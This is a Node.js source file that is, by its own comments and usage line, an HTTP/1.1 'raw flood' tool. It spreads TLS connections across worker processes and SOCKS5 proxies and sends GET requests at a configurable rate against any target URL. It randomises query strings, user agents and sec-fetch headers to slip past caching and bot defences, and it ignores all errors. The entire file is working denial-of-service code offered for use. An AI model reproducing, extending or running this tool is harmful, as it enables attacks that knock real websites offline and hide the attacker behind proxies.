//http1.1 raw flood highrps
const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");  // Добавлено для SOCKS5

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function () { });

if (process.argv.length < 7) {
    console.log(`node tlshttpraw.js target time rate threads proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
];

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1"
    };

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }
    if (Math.random() > 0.5) {
        headers["sec-fetch-user"] = "?1";
    }

    let headerStr = `GET ${rand_path} HTTP/1.1\r\n`;
    headerStr += `Host: ${parsedTarget.host}\r\n`;
    for (const [key, value] of Object.entries(headers)) {
        headerStr += `${key}: ${value}\r\n`;
    }
    headerStr += `Connection: keep-alive\r\n\r\n`;
    return headerStr;
}

// Класс для подключения через SOCKS5 (точно как в tlsfloodbypass.js)
class NetSocket {
    constructor() {}
    SOCKS5(options, callback) {
        const proxyParts = options.proxy.split(':');
        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: options.address.split(':')[0],
                port: 443
            },
            timeout: options.timeout || 10000
        };

        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err) {
                return callback(undefined, "error: " + err);
            }
            const connection = info.socket;
            connection.setKeepAlive(true, 60000);
            return callback(connection, undefined);
        });
    }
}

const Header = new NetSocket();

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const proxyOptions = {
        proxy: proxyAddr,
        address: parsedTarget.host + ":443",
        timeout: 500000
    };

    Header.SOCKS5(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        const tlsOptions = {
            socket: connection,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ALPNProtocols: ["http/1.1"]  // Остаётся HTTP/1.1
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        let IntervalAttack = null;

        tlsConn.on("secureConnect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const requestHeaders = buildHeaders();
                    tlsConn.write(requestHeaders);
                }
            }, 1000);
        });

        tlsConn.on("close", () => {
            clearInterval(IntervalAttack);
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

setTimeout(() => process.exit(1), args.time * 1000);
